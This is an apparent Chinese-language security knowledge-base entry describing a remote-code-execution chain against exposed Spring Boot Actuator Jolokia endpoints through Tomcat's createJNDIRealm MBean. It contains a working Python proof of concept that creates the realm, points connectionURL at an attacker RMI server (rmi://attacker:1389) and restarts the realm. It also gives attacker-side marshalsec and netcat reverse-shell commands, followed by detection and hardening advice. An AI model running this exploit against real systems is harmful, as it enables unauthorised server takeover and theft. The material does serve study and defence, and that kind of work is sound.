---
id: web-java-framework-spring-actuator-jolokia-tomcat-createjndirealm-rce
title: Spring Boot Actuator Jolokia 调用 Tomcat MBeanFactory#createJNDIRealm + Realm 属性写：rmi lookup 触发 JNDI RCE
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-jolokia-tomcat-createjndirealm-jndi-rce
tags:
- java
- spring
- spring-boot
- actuator
- jolokia
- tomcat
- mbean
- jndi
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:34:05+08:00'
  notes: 已对照原文核对：/jolokia/list 搜 type=MBeanFactory/createJNDIRealm，createJNDIRealm → WRITE contextFactory/connectionURL → stop/start 的 exp.py 与原文一致；JDK 版本限制按原文；未截图成功回显，未复跑。
url: /docs/web/java/framework/spring/web-java-framework-spring-actuator-jolokia-tomcat-createjndirealm-rce/
draft: false
kb_aliases:
- createJNDIRealm
- Tomcat MBeanFactory
- jolokia realm JNDI
- Tomcat Realm connectionURL
- /actuator/jolokia 命令执行
---

## 一句话结论

当 Spring Boot 的 Jolokia 端点未授权暴露且内嵌 Tomcat 的 MBean 可见时，攻击者可通过 `Tomcat:type=MBeanFactory#createJNDIRealm` 新建一个 Realm，再写入 `contextFactory=com.sun.jndi.rmi.registry.RegistryContextFactory` 与 `connectionURL=rmi://attacker:1389/JNDIObject`，最后 stop/start 该 Realm 触发 JNDI 查找，由恶意 RMI 服务返回引用并加载远程类，形成命令执行。

## 原理

- Jolokia 暴露 JMX MBean 的读写与调用能力。Tomcat 注册了 `Tomcat:type=MBeanFactory`，其 `createJNDIRealm` 操作可以动态创建一个 `JNDIRealm` MBean，路径形如 `Tomcat:realmPath=/realm0,type=Realm`。
- 新建的 Realm MBean 可通过 Jolokia `WRITE` 修改属性：`contextFactory` 设成 `com.sun.jndi.rmi.registry.RegistryContextFactory`，`connectionURL` 设成攻击者的 `rmi://attacker:1389/JNDIObject`。
- 对 Realm 执行 `stop`/`start` 会触发 `JNDIRealm` 初始化并使用配置的 ContextFactory 连接 `connectionURL`；`RegistryContextFactory` 会对该 RMI 地址执行 lookup。
- 攻击者 RMI 服务返回 `Reference`，其中指定远程 class 与 `ReferenceFactory`；低版本 JDK 允许从远程 codebase 加载类，实例化时执行构造方法/静态初始化，从而 RCE。高版本 JDK 需使用本地工厂 gadget 或 ELProcessor 绕过（原文标注 Oracle JDK 11.0.1、8u191、7u201、6u211 及以上限制远程 codebase）。
- 这条链完全复用 Jolokia 对 Tomcat MBean 的默认暴露；不需要应用自身的业务漏洞，只要 Jolokia 可达且 Tomcat MBean 未被访问策略限制。

## 触发条件

- `/jolokia`（1.x）或 `/actuator/jolokia`（2.x）未授权可访问，且应用引入 `jolokia-core`。
- Jolokia 的 `jolokia-access.xml` 未禁止对 `Tomcat:type=MBeanFactory` 等 Tomcat MBean 的写/执行操作。
- 目标为内嵌 Tomcat，MBean 已注册；`/jolokia/list` 中可搜索到 `type=MBeanFactory` 与 `createJNDIRealm`。
- 目标能出站访问攻击者 RMI 服务，JDK 允许远程 codebase 或有高版本绕过链。

## 利用步骤

1. 访问 `/jolokia/list` 或 `/actuator/jolokia/list`，搜索 `type=MBeanFactory` 与 `createJNDIRealm`，确认 Tomcat MBean 可操作。
2. 在攻击机启动恶意 RMI 服务，返回 `JNDIObject` 引用：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://attacker:8000/#JNDIObject 1389
```

3. 依次向 `/jolokia`（或 `/actuator/jolokia`）发送 5 个 JSON 操作：创建 Realm、写 `contextFactory`、写 `connectionURL`、stop、start。
4. stop/start 时目标连接 RMI 服务，加载 `JNDIObject` 并执行其静态块/构造方法；攻击机监听端口接收反弹 shell。
5. 若 RMI 远程 codebase 被高版本 JDK 拦截，改用返回本地工厂的 LDAP/RMI 服务，或选择 classpath 上已有的 ObjectFactory gadget。

## PoC

```python
#!/usr/bin/env python3
import requests

url = 'http://target/jolokia'

create_realm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}
write_factory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}
write_url = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://attacker:1389/JNDIObject"
}
stop = {"mbean": "Tomcat:realmPath=/realm0,type=Realm", "type": "EXEC", "operation": "stop", "arguments": []}
start = {"mbean": "Tomcat:realmPath=/realm0,type=Realm", "type": "EXEC", "operation": "start", "arguments": []}

for op in [create_realm, write_factory, write_url, stop, start]:
    r = requests.post(url, json=op)
    print(op['type'], op['mbean'], r.status_code)
```

攻击端：

```bash
javac -source 1.5 -target 1.5 JNDIObject.java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://attacker:8000/#JNDIObject 1389
nc -lvnp 3333
```

## 变体与关联

- 变体：把 `connectionURL` 换成 `ldap://`，配合 `LDAPRefServer`。
- 变体：若 `createJNDIRealm` 被禁用，可寻找其他可写数据源/工厂的 Tomcat MBean（如 JDBCRealm、DataSourceFactory）实现类似效果。
- 关联：[[web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-jndi-rce]]（同一 Jolokia 入口，改用 logback reloadByURL 触发 JNDI）、[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]（Tomcat 本地工厂 gadget）、[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（JNDI 远程 codebase 基础）。
- 边界：Jolokia 被鉴权/关闭、Tomcat MBean 被访问策略禁止、目标不能出站、JDK 高版本且无本地工厂 gadget 时，该链不成立。

## 检测与防御

- 检测：`/jolokia` 请求中出现 `Tomcat:type=MBeanFactory`、`createJNDIRealm`、`Tomcat:realmPath`、`contextFactory`、`RegistryContextFactory`、`connectionURL`、`rmi://`；应用异常外连 1389/1099。
- 防御：关闭或鉴权 Jolokia 端点；用 `jolokia-access.xml` 限制 MBean 白名单，禁止对 Tomcat 管理 MBean 的 WRITE/EXEC。
- 防御：升级 JDK 并禁用 JNDI 远程 codebase；限制应用出站访问；生产环境移除 Jolokia 或不暴露 Tomcat MBean。
- 加固：Actuator/Jolokia 仅绑内网或独立管理端口，加认证与审计。
